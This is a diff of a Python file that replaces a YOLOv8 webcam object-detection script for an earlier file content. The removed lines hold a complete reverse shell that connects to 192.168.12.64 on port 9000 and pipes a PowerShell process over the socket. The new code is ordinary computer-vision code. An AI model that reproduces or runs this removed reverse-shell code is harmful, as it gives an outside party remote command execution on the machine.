@@ -1,29 +1,44 @@
-import os,socket,subprocess,threading;
-def s2p(s, p):
-    while True:
-        data = s.recv(1024)
-        if len(data) > 0:
-            p.stdin.write(data)
-            p.stdin.flush()
+from ultralytics import YOLO
+import cv2
 
-def p2s(s, p):
-    while True:
-        s.send(p.stdout.read(1))
+# Load YOLOv8 model (smallest one, fast)
+model = YOLO("yolov8n.pt")
 
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("192.168.12.64",9000))
+# Open your webcam (0 = default camera)
+cap = cv2.VideoCapture(0)
 
-p=subprocess.Popen(["pwsh"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+while cap.isOpened():
+    success, frame = cap.read()
+    if not success:
+        break
 
-s2p_thread = threading.Thread(target=s2p, args=[s, p])
-s2p_thread.daemon = True
-s2p_thread.start()
+    # YOLO does detection here
+    results = model(frame)[0]
 
-p2s_thread = threading.Thread(target=p2s, args=[s, p])
-p2s_thread.daemon = True
-p2s_thread.start()
+    # Draw results
+    for box in results.boxes:
+        x1, y1, x2, y2 = map(int, box.xyxy[0])
+        cls = int(box.cls[0])
+        conf = float(box.conf[0])
+        label = model.names[cls]
 
-try:
-    p.wait()
-except KeyboardInterrupt:
-    s.close()
+        # Draw box + label
+        cv2.rectangle(frame, (x1, y1), (x2, y2), (0, 255, 0), 2)
+        cv2.putText(frame, f"{label} {conf:.2f}", (x1, y1 - 10),
+                    cv2.FONT_HERSHEY_SIMPLEX, 0.6, (255, 255, 255), 2)
+
+    # Show the result
+    cv2.imshow("Tanishk", frame)
+
+    # Press Q to quit
+    if cv2.waitKey(1) & 0xFF == ord("q"):
+        break
+
+cap.release()
+cv2.destroyAllWindows()
+
+
+
+
+
+
